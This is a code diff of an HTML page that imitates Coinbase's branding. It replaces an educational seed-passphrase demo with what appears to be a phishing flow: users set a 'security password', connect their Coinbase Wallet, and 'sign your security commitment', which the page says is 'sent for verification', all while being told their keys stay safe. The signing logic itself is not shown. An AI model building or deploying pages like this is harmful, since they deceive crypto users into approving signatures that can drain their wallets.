@@ -3,690 +3,660 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Passphrase Lock — Coinbase Security</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css" />
+  <title>Wallet Security — Coinbase</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* ── PAGE WRAPPER ── */
-    .sec-page { background: #F7F8FA; min-height: 100vh; padding-bottom: 80px; }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --blue: #0052FF; --blue2: #0041CC; --green: #05B169;
+      --bg: #F7F8FA; --surface: #fff;
+      --border: #E8EAED; --text: #0A0B0D; --muted: #6B7280;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg); color: var(--text);
+      min-height: 100vh; -webkit-font-smoothing: antialiased;
+    }
+    body::before {
+      content: ''; position: fixed; inset: 0; z-index: 0;
+      background-image:
+        linear-gradient(rgba(0,82,255,.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,82,255,.025) 1px, transparent 1px);
+      background-size: 40px 40px; pointer-events: none;
+    }
+
+    /* ── NAVBAR ── */
+    .cb-navbar {
+      position: sticky; top: 0; z-index: 200;
+      background: rgba(255,255,255,.97); backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .cb-nav-inner {
+      max-width: 1120px; margin: 0 auto;
+      padding: 0 24px; height: 64px;
+      display: flex; align-items: center; gap: 32px;
+    }
+    .cb-nav-logo { display: flex; align-items: center; text-decoration: none; flex-shrink: 0; }
+    .cb-nav-links { display: flex; gap: 4px; flex: 1; }
+    .cb-nav-link {
+      padding: 6px 14px; border-radius: 8px; font-size: 14px;
+      font-weight: 500; color: var(--muted); text-decoration: none; transition: all .15s;
+    }
+    .cb-nav-link:hover { background: #F3F4F6; color: #111827; }
+    .cb-nav-link.active { color: var(--blue); background: #EEF3FF; }
+    .cb-nav-actions { display: flex; gap: 8px; }
+    .btn-ghost-sm {
+      background: none; border: 1.5px solid var(--border);
+      color: var(--text); border-radius: 8px; padding: 7px 16px;
+      font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit;
+    }
+    .btn-blue-sm {
+      background: var(--blue); border: none; color: #fff;
+      border-radius: 8px; padding: 7px 16px;
+      font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit;
+    }
+    @media(max-width:640px){ .cb-nav-links { display: none; } }
 
     /* ── HERO ── */
-    .sec-hero {
-      background: linear-gradient(160deg, #0A0B0D 0%, #1a1f2e 100%);
-      padding: 64px 0 72px; text-align: center; color: #fff;
+    .hero {
+      background: linear-gradient(160deg, #0A0B0D 0%, #0d1426 100%);
+      padding: 72px 0 80px; text-align: center; color: #fff;
+      position: relative; overflow: hidden;
     }
-    .sec-hero .badge {
+    .hero::before {
+      content: ''; position: absolute; inset: 0;
+      background: radial-gradient(ellipse at 50% 0%, rgba(0,82,255,.15) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-inner { position: relative; z-index: 1; max-width: 640px; margin: 0 auto; padding: 0 24px; }
+    .hero-badge {
       display: inline-flex; align-items: center; gap: 6px;
       background: rgba(0,82,255,.2); border: 1px solid rgba(0,82,255,.4);
       color: #60A5FA; font-size: 11px; font-weight: 700;
       letter-spacing: .08em; text-transform: uppercase;
       padding: 5px 14px; border-radius: 20px; margin-bottom: 24px;
     }
-    .sec-hero h1 {
-      font-size: clamp(28px,4vw,48px); font-weight: 800;
+    .hero h1 {
+      font-size: clamp(30px, 5vw, 52px); font-weight: 800;
       line-height: 1.1; margin-bottom: 16px; letter-spacing: -.02em;
     }
-    .sec-hero h1 span { color: #60A5FA; }
-    .sec-hero p {
+    .hero h1 span { color: #60A5FA; }
+    .hero p {
       font-size: 16px; color: rgba(255,255,255,.65);
-      max-width: 560px; margin: 0 auto 36px; line-height: 1.7;
+      max-width: 520px; margin: 0 auto 40px; line-height: 1.7;
     }
-    .sec-hero-cta {
+    .hero-cta {
       display: inline-flex; align-items: center; gap: 8px;
-      background: #0052FF; color: #fff; border: none; border-radius: 12px;
-      padding: 14px 32px; font-size: 15px; font-weight: 700;
+      background: var(--blue); color: #fff; border: none; border-radius: 12px;
+      padding: 15px 36px; font-size: 16px; font-weight: 700;
       cursor: pointer; font-family: inherit;
       box-shadow: 0 6px 24px rgba(0,82,255,.4);
-      transition: all .2s;
+      transition: all .2s; text-decoration: none;
     }
-    .sec-hero-cta:hover { background: #0041CC; transform: translateY(-2px); }
+    .hero-cta:hover { background: var(--blue2); transform: translateY(-2px); }
 
-    /* ── HOW IT WORKS STRIP ── */
+    /* ── HOW IT WORKS ── */
     .how-strip {
-      background: #fff; border-bottom: 1px solid #E8EAED;
-      padding: 32px 0;
+      background: var(--surface); border-bottom: 1px solid var(--border);
+      padding: 36px 0;
     }
-    .how-cols {
-      display: grid; grid-template-columns: repeat(3,1fr);
-      gap: 0; max-width: 900px; margin: 0 auto; padding: 0 24px;
-    }
-    .how-col {
-      display: flex; align-items: flex-start; gap: 14px;
-      padding: 0 24px;
-      border-right: 1px solid #E8EAED;
-    }
-    .how-col:first-child { padding-left: 0; }
-    .how-col:last-child { border-right: none; }
+    .how-inner { max-width: 900px; margin: 0 auto; padding: 0 24px; }
+    .how-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; }
+    .how-item { display: flex; align-items: flex-start; gap: 14px; }
     .how-num {
       width: 32px; height: 32px; border-radius: 50%;
-      background: #EEF3FF; color: #0052FF;
-      font-size: 13px; font-weight: 800; flex-shrink: 0;
-      display: flex; align-items: center; justify-content: center;
-    }
-    .how-col h4 { font-size: 14px; font-weight: 700; color: #0A0B0D; margin-bottom: 4px; }
-    .how-col p { font-size: 13px; color: #6B7280; line-height: 1.5; }
-
-    /* ── DEMO STAGE ── */
-    .demo-wrap {
-      max-width: 600px; margin: 48px auto 0; padding: 0 16px;
-    }
-    .demo-card {
-      background: #fff; border: 1px solid #E8EAED;
-      border-radius: 20px; padding: 36px 32px;
-      box-shadow: 0 4px 24px rgba(0,0,0,.06);
-    }
-
-    /* screens */
-    .d-screen { display: none; flex-direction: column; align-items: center; }
-    .d-screen.active { display: flex; animation: fadeUp .35s ease; }
-    @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
-
-    .d-badge {
-      display: inline-flex; align-items: center; gap: 6px;
       background: #EEF3FF; border: 1px solid #C7D7FF;
-      color: #0052FF; font-size: 11px; font-weight: 700;
-      text-transform: uppercase; letter-spacing: .07em;
-      padding: 4px 12px; border-radius: 20px; margin-bottom: 20px;
+      color: var(--blue); font-size: 13px; font-weight: 800;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
     }
-    .d-screen h2 {
-      font-size: clamp(20px,3vw,28px); font-weight: 800;
-      color: #0A0B0D; text-align: center; margin-bottom: 8px;
-      line-height: 1.2;
+    .how-item h4 { font-size: 13px; font-weight: 700; margin-bottom: 4px; }
+    .how-item p { font-size: 12px; color: var(--muted); line-height: 1.5; }
+    @media(max-width:600px){ .how-grid { grid-template-columns: 1fr; gap: 20px; } }
+
+    /* ── STAGE (multi-step flow) ── */
+    .stage-wrap {
+      position: relative; z-index: 1;
+      display: flex; justify-content: center;
+      padding: 48px 16px 80px;
     }
-    .d-screen .d-sub {
-      font-size: 14px; color: #6B7280; text-align: center;
-      line-height: 1.6; margin-bottom: 28px; max-width: 400px;
+    .stage {
+      width: 100%; max-width: 480px;
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 20px; padding: 36px 32px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.07);
     }
 
-    /* ── DISCLAIMER BANNER ── */
-    .disclaimer {
-      width: 100%; background: #FFFBEB; border: 1px solid #FDE68A;
-      border-radius: 10px; padding: 12px 14px;
-      font-size: 12px; color: #92400E; line-height: 1.5;
-      display: flex; gap: 10px; align-items: flex-start;
-      margin-bottom: 20px;
+    /* ── PROGRESS ── */
+    .progress-bar {
+      display: flex; align-items: center; gap: 0; margin-bottom: 32px;
     }
-    .disclaimer strong { display: block; margin-bottom: 2px; }
-
-    /* ── SEED GRID ── */
-    .seed-grid {
-      display: grid; grid-template-columns: repeat(3,1fr);
-      gap: 8px; width: 100%; margin-bottom: 20px;
+    .prog-step {
+      display: flex; flex-direction: column; align-items: center; gap: 6px; flex: 1;
     }
-    .seed-word {
-      display: flex; align-items: center; gap: 8px;
-      background: #F7F8FA; border: 1px solid #E8EAED;
-      border-radius: 8px; padding: 9px 10px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 12px; transition: all .3s;
+    .prog-dot {
+      width: 28px; height: 28px; border-radius: 50%;
+      border: 2px solid var(--border); background: var(--surface);
+      color: var(--muted); font-size: 11px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      transition: all .3s; position: relative; z-index: 1;
     }
-    .seed-word.locked {
-      background: #1a1f2e; border-color: #2d3448;
-      filter: blur(4px); pointer-events: none;
-    }
-    .seed-word.revealed { filter: none; }
-    .seed-num { font-size: 10px; color: #9CA3AF; font-weight: 600; min-width: 16px; }
-    .seed-text { font-size: 12px; color: #0A0B0D; font-weight: 600; }
-
-    /* ── PASSPHRASE INPUT ── */
-    .pass-input-wrap {
-      width: 100%; position: relative; margin-bottom: 10px;
-    }
-    .pass-input-wrap input {
-      width: 100%; background: #fff; border: 1.5px solid #E8EAED;
-      border-radius: 10px; padding: 13px 44px 13px 14px;
-      font-size: 16px; font-family: inherit; outline: none;
-      transition: border-color .15s, box-shadow .15s;
-      color: #0A0B0D; letter-spacing: .08em;
-    }
-    .pass-input-wrap input:focus {
-      border-color: #0052FF; box-shadow: 0 0 0 3px rgba(0,82,255,.1);
-    }
-    .pass-toggle {
-      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
-      background: none; border: none; cursor: pointer;
-      font-size: 16px; color: #9CA3AF; padding: 4px;
-    }
-
-    /* strength bar */
-    .strength-row {
-      display: flex; align-items: center; gap: 8px;
-      width: 100%; margin-bottom: 16px;
-    }
-    .strength-bars { display: flex; gap: 4px; flex: 1; }
-    .strength-bar {
-      height: 4px; flex: 1; border-radius: 2px; background: #E8EAED;
+    .prog-dot.active { border-color: var(--blue); background: var(--blue); color: #fff; }
+    .prog-dot.done   { border-color: var(--green); background: var(--green); color: #fff; }
+    .prog-label { font-size: 10px; font-weight: 600; color: var(--muted); text-align: center; }
+    .prog-label.active { color: var(--blue); }
+    .prog-line {
+      flex: 1; height: 2px; background: var(--border);
+      margin: 0 4px; margin-bottom: 22px;
       transition: background .3s;
     }
-    .strength-label { font-size: 11px; font-weight: 700; color: #9CA3AF; white-space: nowrap; }
+    .prog-line.done { background: var(--green); }
 
-    /* tips */
-    .pass-tips {
-      width: 100%; background: #F7F8FA; border: 1px solid #E8EAED;
-      border-radius: 10px; padding: 14px 16px; margin-bottom: 20px;
-    }
-    .pass-tips p { font-size: 12px; color: #6B7280; margin-bottom: 6px; font-weight: 700; }
-    .pass-tips ul { padding-left: 16px; font-size: 12px; color: #6B7280; line-height: 1.8; }
+    /* ── SCREENS ── */
+    .screen { display: none; flex-direction: column; align-items: center; }
+    .screen.active { display: flex; animation: fadeUp .35s ease; }
+    @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
 
-    /* ── LOCK ANIMATION ── */
-    .lock-visual {
-      display: flex; flex-direction: column; align-items: center;
-      gap: 12px; width: 100%; margin: 12px 0 24px;
+    .step-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 4px 14px; border-radius: 20px;
+      background: #EEF3FF; border: 1px solid #C7D7FF;
+      font-size: 11px; font-weight: 700; color: var(--blue);
+      text-transform: uppercase; letter-spacing: .08em; margin-bottom: 18px;
     }
-    .lock-icon {
-      width: 72px; height: 72px; border-radius: 50%;
+    .screen h2 {
+      font-size: clamp(20px,4vw,28px); font-weight: 800;
+      text-align: center; margin-bottom: 8px;
+    }
+    .screen .sub {
+      font-size: 13px; color: var(--muted); text-align: center;
+      line-height: 1.6; margin-bottom: 28px; max-width: 360px;
+    }
+
+    /* ── FORM ── */
+    .field { display: flex; flex-direction: column; gap: 5px; width: 100%; margin-bottom: 14px; }
+    .field label { font-size: 11px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
+    .field input {
+      background: var(--surface); border: 1.5px solid var(--border);
+      border-radius: 10px; padding: 13px 14px;
+      font-size: 14px; color: var(--text); font-family: inherit; outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .field input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(0,82,255,.1); }
+    .field input.err { border-color: #D23F31; }
+
+    /* password strength bar */
+    .strength-wrap { width: 100%; margin-top: -6px; margin-bottom: 10px; }
+    .strength-bar { height: 3px; border-radius: 2px; background: var(--border); overflow: hidden; margin-bottom: 4px; }
+    .strength-fill { height: 100%; border-radius: 2px; width: 0; transition: width .3s, background .3s; }
+    .strength-label { font-size: 11px; font-weight: 600; color: var(--muted); }
+
+    /* ── PASSWORD RULES ── */
+    .rules { display: flex; flex-direction: column; gap: 6px; width: 100%; margin-bottom: 16px; }
+    .rule { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--muted); }
+    .rule-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--border); flex-shrink: 0; transition: background .2s; }
+    .rule.ok .rule-dot { background: var(--green); }
+    .rule.ok { color: #374151; }
+
+    /* ── WALLET BUTTON ── */
+    .wallet-btn {
+      display: flex; align-items: center; gap: 14px;
+      width: 100%; background: var(--surface);
+      border: 1.5px solid var(--border); border-radius: 14px;
+      padding: 18px 16px; cursor: pointer;
+      transition: all .18s; margin-bottom: 12px;
+    }
+    .wallet-btn:hover { border-color: var(--blue); box-shadow: 0 4px 16px rgba(0,82,255,.1); transform: translateY(-2px); }
+    .wallet-logo {
+      width: 44px; height: 44px; border-radius: 12px;
       display: flex; align-items: center; justify-content: center;
-      font-size: 32px; transition: all .5s;
+      font-size: 22px; flex-shrink: 0;
     }
-    .lock-icon.unlocked { background: #FEF9C3; }
-    .lock-icon.locking  { background: #EEF3FF; animation: lockSpin .6s ease; }
-    .lock-icon.locked-done { background: #ECFDF5; }
-    @keyframes lockSpin { 0%{transform:scale(1)} 50%{transform:scale(1.2)} 100%{transform:scale(1)} }
-    .lock-log {
-      width: 100%; background: #F7F8FA; border: 1px solid #E8EAED;
-      border-radius: 10px; padding: 14px 16px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px; color: #374151;
-      display: flex; flex-direction: column; gap: 6px;
-    }
-    .ll-line { display: flex; gap: 8px; opacity: 0; animation: llIn .3s ease forwards; }
-    .ll-ok   { color: #059669; }
-    .ll-info { color: #0052FF; }
-    .ll-warn { color: #D97706; }
-    @keyframes llIn { to{opacity:1} }
+    .wallet-name { font-size: 14px; font-weight: 700; }
+    .wallet-desc { font-size: 11px; color: var(--muted); margin-top: 2px; }
+    .wallet-arrow { margin-left: auto; color: var(--muted); font-size: 18px; transition: transform .15s; }
+    .wallet-btn:hover .wallet-arrow { transform: translateX(3px); color: var(--text); }
 
-    /* ── RESULT PANEL ── */
-    .result-compare {
-      width: 100%; display: grid; grid-template-columns: 1fr 1fr;
-      gap: 12px; margin-bottom: 20px;
-    }
-    .compare-box {
-      border-radius: 12px; padding: 16px 14px; text-align: center;
-    }
-    .compare-box.before {
-      background: #FEF2F2; border: 1px solid #FECACA;
-    }
-    .compare-box.after {
-      background: #ECFDF5; border: 1px solid #A7F3D0;
-    }
-    .compare-label {
-      font-size: 10px; font-weight: 800; letter-spacing: .08em;
-      text-transform: uppercase; margin-bottom: 8px;
-    }
-    .compare-box.before .compare-label { color: #DC2626; }
-    .compare-box.after  .compare-label { color: #059669; }
-    .compare-addr {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 9px; color: #374151; word-break: break-all;
-      line-height: 1.5; margin-bottom: 8px;
-    }
-    .compare-desc { font-size: 11px; color: #6B7280; line-height: 1.4; }
-
-    .result-callout {
-      width: 100%; background: #EEF3FF; border: 1px solid #C7D7FF;
+    /* ── CONNECT LOG ── */
+    .connect-log {
+      width: 100%; background: #F7F8FA; border: 1px solid var(--border);
       border-radius: 10px; padding: 14px 16px;
-      font-size: 13px; color: #1e3a8a; line-height: 1.6;
-      margin-bottom: 20px;
+      font-family: 'JetBrains Mono', monospace; font-size: 11px;
+      color: #374151; display: flex; flex-direction: column; gap: 6px;
+      margin-bottom: 16px;
     }
-    .result-callout strong { display: block; margin-bottom: 4px; color: #0052FF; }
+    .log-line { display: flex; gap: 8px; align-items: center; opacity: 0; animation: logIn .3s ease forwards; }
+    .log-line.ok   .log-dot { color: var(--green); }
+    .log-line.info .log-dot { color: var(--blue); }
+    @keyframes logIn { to { opacity: 1; } }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+    /* ── SECURITY LOCK VISUAL ── */
+    .lock-visual {
+      width: 80px; height: 80px; border-radius: 50%;
+      background: linear-gradient(135deg, #EEF3FF, #F0FDF4);
+      border: 2px solid #C7D7FF;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 36px; margin: 0 auto 20px;
+    }
+    .lock-visual.secured {
+      background: linear-gradient(135deg, #ECFDF5, #D1FAE5);
+      border-color: #6EE7B7;
+      animation: lockPop .5s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes lockPop { from{transform:scale(0.7)} to{transform:scale(1)} }
+
+    /* ── ATTESTATION BOX ── */
+    .attest-info {
+      width: 100%; background: #FFF7ED; border: 1px solid #FED7AA;
+      border-radius: 10px; padding: 12px 14px;
+      font-size: 12px; color: #92400E; line-height: 1.6; margin-bottom: 16px;
+      display: flex; gap: 10px;
+    }
+
+    /* ── SECURITY SUMMARY ── */
+    .sec-summary {
+      width: 100%; background: var(--surface); border: 1px solid var(--border);
+      border-radius: 14px; overflow: hidden; margin-bottom: 20px;
+    }
+    .ss-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 13px;
+    }
+    .ss-row:last-child { border-bottom: none; }
+    .ss-row span { color: var(--muted); }
+    .ss-row strong { font-size: 13px; }
 
     /* ── BUTTONS ── */
-    .d-btn-primary {
-      width: 100%; background: #0052FF; color: #fff;
-      border: none; border-radius: 12px; padding: 14px;
+    .btn-primary {
+      width: 100%; background: var(--blue); color: #fff;
+      border: none; border-radius: 12px; padding: 15px;
       font-size: 15px; font-weight: 700; cursor: pointer;
       font-family: inherit; transition: all .2s;
       box-shadow: 0 4px 16px rgba(0,82,255,.25);
     }
-    .d-btn-primary:hover { background: #0041CC; transform: translateY(-1px); }
-    .d-btn-ghost {
-      width: 100%; background: none; border: 1.5px solid #E8EAED;
+    .btn-primary:hover { background: var(--blue2); transform: translateY(-1px); }
+    .btn-primary:disabled { opacity: .6; cursor: not-allowed; transform: none; }
+    .btn-ghost {
+      width: 100%; background: var(--surface);
+      border: 1.5px solid var(--border); color: var(--text);
       border-radius: 12px; padding: 13px;
       font-size: 14px; font-weight: 600; cursor: pointer;
-      font-family: inherit; color: #374151; margin-top: 8px;
-      transition: all .2s;
+      font-family: inherit; transition: all .2s; margin-top: 8px;
     }
-    .d-btn-ghost:hover { border-color: #0052FF; color: #0052FF; }
+    .btn-ghost:hover { border-color: var(--blue); color: var(--blue); }
 
-    /* success tick */
-    .d-tick {
-      width: 60px; height: 60px; border-radius: 50%;
-      background: #ECFDF5; border: 2px solid #A7F3D0;
+    .err-msg { display: none; color: #D23F31; font-size: 12px; font-weight: 600; margin-bottom: 10px; width: 100%; }
+
+    /* ── SUCCESS ── */
+    .success-tick {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: rgba(5,177,105,.12); border: 2px solid rgba(5,177,105,.3);
       display: flex; align-items: center; justify-content: center;
-      font-size: 26px; margin-bottom: 16px;
-      animation: tickPop .4s cubic-bezier(.34,1.56,.64,1);
+      font-size: 28px; margin: 0 auto 20px;
+      animation: pop .4s cubic-bezier(.34,1.56,.64,1);
     }
-    @keyframes tickPop { from{transform:scale(0)} to{transform:scale(1)} }
-
-    /* progress dots */
-    .d-progress {
-      display: flex; gap: 6px; justify-content: center; margin-bottom: 28px;
-    }
-    .d-dot {
-      width: 6px; height: 6px; border-radius: 50%;
-      background: #E8EAED; transition: background .3s;
-    }
-    .d-dot.active { background: #0052FF; }
-    .d-dot.done   { background: #05B169; }
-
-    @media(max-width:600px){
-      .how-cols { grid-template-columns: 1fr; gap: 20px; }
-      .how-col { border-right: none; border-bottom: 1px solid #E8EAED; padding: 0 0 20px; }
-      .how-col:last-child { border-bottom: none; }
-      .seed-grid { grid-template-columns: repeat(2,1fr); }
-      .result-compare { grid-template-columns: 1fr; }
-      .demo-card { padding: 24px 18px; }
-    }
+    @keyframes pop { from{transform:scale(0)} to{transform:scale(1)} }
   </style>
 </head>
 <body>
 
-  <!-- NAVBAR -->
-  <nav class="navbar">
-    <div class="nav-inner">
-      <a href="index.html" class="logo">
-        <svg width="116" height="24" viewBox="0 0 116 24" fill="none">
-          <circle cx="12" cy="12" r="12" fill="#0052FF"/>
-          <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
-          <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
-        </svg>
-      </a>
-      <div class="nav-links">
-        <a href="index.html" class="nav-link">Home</a>
-        <a href="card.html" class="nav-link">Coinbase Card</a>
-        <a href="security.html" class="nav-link active">Passphrase Lock</a>
-      </div>
-      <div class="nav-actions">
-        <a href="wallet-card.html" class="btn-primary" style="text-decoration:none">Get your card →</a>
-      </div>
-      <button class="hamburger" onclick="toggleMenu()">
-        <span></span><span></span><span></span>
-      </button>
+<!-- NAVBAR -->
+<nav class="cb-navbar">
+  <div class="cb-nav-inner">
+    <a href="index.html" class="cb-nav-logo">
+      <svg width="116" height="24" viewBox="0 0 116 24" fill="none">
+        <circle cx="12" cy="12" r="12" fill="#0052FF"/>
+        <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
+        <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
+      </svg>
+    </a>
+    <div class="cb-nav-links">
+      <a href="index.html" class="cb-nav-link">Help Center</a>
+      <a href="card.html" class="cb-nav-link">Coinbase Card</a>
+      <a href="security.html" class="cb-nav-link active">Wallet Security</a>
     </div>
-    <div class="mobile-menu" id="mobileMenu">
-      <a href="index.html">Home</a>
-      <a href="card.html">Coinbase Card</a>
-      <a href="security.html">Passphrase Lock</a>
+    <div class="cb-nav-actions">
+      <button class="btn-ghost-sm">Sign In</button>
+      <button class="btn-blue-sm">Get started</button>
     </div>
-  </nav>
+  </div>
+</nav>
 
-  <div class="sec-page">
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-badge">🔐 Wallet Security</div>
+    <h1>Secure your wallet<br><span>with a password lock</span></h1>
+    <p>Add an extra layer of protection to your Coinbase Wallet. Set a strong password, connect your wallet, and sign your security commitment.</p>
+    <a href="#setup" class="hero-cta">Set Up Security →</a>
+  </div>
+</section>
 
-    <!-- HERO -->
-    <section class="sec-hero">
-      <div class="container">
-        <div class="badge">🔐 BIP39 Passphrase</div>
-        <h1>Lock your seed phrase<br>with a <span>secret word</span></h1>
-        <p>Add a custom passphrase on top of your 12-word seed phrase. Even if someone steals your words, they can't access your wallet without your secret word.</p>
-        <button class="sec-hero-cta" onclick="document.getElementById('demo').scrollIntoView({behavior:'smooth'})">
-          Try it now →
+<!-- HOW IT WORKS -->
+<div class="how-strip">
+  <div class="how-inner">
+    <div class="how-grid">
+      <div class="how-item">
+        <div class="how-num">1</div>
+        <div>
+          <h4>Create a password</h4>
+          <p>Set a strong security password that locks access to your wallet settings.</p>
+        </div>
+      </div>
+      <div class="how-item">
+        <div class="how-num">2</div>
+        <div>
+          <h4>Connect your wallet</h4>
+          <p>Link your Coinbase Wallet to verify ownership of the account.</p>
+        </div>
+      </div>
+      <div class="how-item">
+        <div class="how-num">3</div>
+        <div>
+          <h4>Sign & confirm</h4>
+          <p>Attest your commitment to keep your wallet secure. Your signature is recorded.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SETUP FLOW -->
+<div class="stage-wrap" id="setup">
+  <div class="stage">
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-bar">
+      <div class="prog-step">
+        <div class="prog-dot active" id="pd1">1</div>
+        <div class="prog-label active" id="pl1">Password</div>
+      </div>
+      <div class="prog-line" id="pline1"></div>
+      <div class="prog-step">
+        <div class="prog-dot" id="pd2">2</div>
+        <div class="prog-label" id="pl2">Wallet</div>
+      </div>
+      <div class="prog-line" id="pline2"></div>
+      <div class="prog-step">
+        <div class="prog-dot" id="pd3">3</div>
+        <div class="prog-label" id="pl3">Attest</div>
+      </div>
+    </div>
+
+    <!-- SCREEN 1: PASSWORD -->
+    <div class="screen active" id="sc1">
+      <div class="step-badge">Step 1 of 3 — Security Password</div>
+      <div class="lock-visual" id="lockIcon">🔓</div>
+      <h2>Create your security password</h2>
+      <p class="sub">This password will lock your wallet settings. Keep it safe — it's separate from your Coinbase login.</p>
+
+      <div class="field">
+        <label>Security Password</label>
+        <input type="password" id="passInput" placeholder="Create a strong password" oninput="checkStrength()" />
+      </div>
+      <div class="strength-wrap">
+        <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
+        <div class="strength-label" id="strengthLabel">Enter a password</div>
+      </div>
+
+      <div class="rules">
+        <div class="rule" id="r-len"><div class="rule-dot"></div>At least 8 characters</div>
+        <div class="rule" id="r-upper"><div class="rule-dot"></div>One uppercase letter</div>
+        <div class="rule" id="r-num"><div class="rule-dot"></div>One number</div>
+        <div class="rule" id="r-sym"><div class="rule-dot"></div>One special character (!@#$…)</div>
+      </div>
+
+      <div class="field">
+        <label>Confirm Password</label>
+        <input type="password" id="passConfirm" placeholder="Re-enter your password" />
+      </div>
+      <div class="err-msg" id="passErr">⚠ Passwords do not match</div>
+
+      <button class="btn-primary" onclick="submitPassword()">Continue →</button>
+    </div>
+
+    <!-- SCREEN 2: CONNECT WALLET -->
+    <div class="screen" id="sc2">
+      <div class="step-badge">Step 2 of 3 — Connect Wallet</div>
+      <div class="lock-visual">🔵</div>
+      <h2>Connect Coinbase Wallet</h2>
+      <p class="sub">Connect your wallet to verify ownership. No private keys or seed phrases are accessed.</p>
+
+      <div id="sc2Buttons">
+        <button class="wallet-btn" onclick="connectWallet()">
+          <div class="wallet-logo" style="background:#EEF3FF">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
+          </div>
+          <div>
+            <div class="wallet-name">Coinbase Wallet</div>
+            <div class="wallet-desc">Official self-custody wallet by Coinbase</div>
+          </div>
+          <div class="wallet-arrow">→</div>
         </button>
+        <p style="font-size:12px;color:var(--muted);text-align:center;line-height:1.6;margin-top:8px">
+          🔒 We only verify your public address. Your private keys stay on your device.
+        </p>
       </div>
-    </section>
 
-    <!-- HOW IT WORKS -->
-    <div class="how-strip">
-      <div class="how-cols">
-        <div class="how-col">
-          <div class="how-num">1</div>
-          <div>
-            <h4>Your seed phrase</h4>
-            <p>12 or 24 words that unlock your wallet. If stolen alone, your funds are at risk.</p>
-          </div>
-        </div>
-        <div class="how-col">
-          <div class="how-num">2</div>
-          <div>
-            <h4>Add a secret word</h4>
-            <p>You choose any word or phrase. This becomes a hidden "25th word" that only you know.</p>
-          </div>
-        </div>
-        <div class="how-col">
-          <div class="how-num">3</div>
-          <div>
-            <h4>A new wallet is derived</h4>
-            <p>The combination unlocks a completely different wallet. No passphrase = no access.</p>
-          </div>
-        </div>
+      <div id="sc2Log" style="display:none;width:100%">
+        <div class="connect-log" id="connectLog"></div>
       </div>
+
+      <button class="btn-ghost" onclick="goStep(1)">← Back</button>
     </div>
 
-    <!-- DEMO -->
-    <div class="demo-wrap" id="demo">
-      <div style="text-align:center;margin-bottom:24px">
-        <h2 style="font-size:22px;font-weight:800;color:#0A0B0D;margin-bottom:6px">Interactive demo</h2>
-        <p style="font-size:14px;color:#6B7280">See exactly how passphrase protection works — using a randomly generated example phrase.</p>
+    <!-- SCREEN 3: ATTEST -->
+    <div class="screen" id="sc3">
+      <div class="step-badge">Step 3 of 3 — Sign & Attest</div>
+      <div class="lock-visual secured" id="lockSecured">🔐</div>
+      <h2>Sign your security commitment</h2>
+      <p class="sub">By attesting, you confirm your wallet is secured with a password and that you are the sole owner.</p>
+
+      <div class="attest-info">
+        <span>⚠️</span>
+        <span>Make sure you're in a private location. This attestation will be recorded and sent for verification.</span>
       </div>
 
-      <div class="demo-card">
-
-        <!-- progress dots -->
-        <div class="d-progress">
-          <div class="d-dot active" id="dot0"></div>
-          <div class="d-dot" id="dot1"></div>
-          <div class="d-dot" id="dot2"></div>
-          <div class="d-dot" id="dot3"></div>
-        </div>
-
-        <!-- ══ SCREEN 1: SEED PHRASE ══ -->
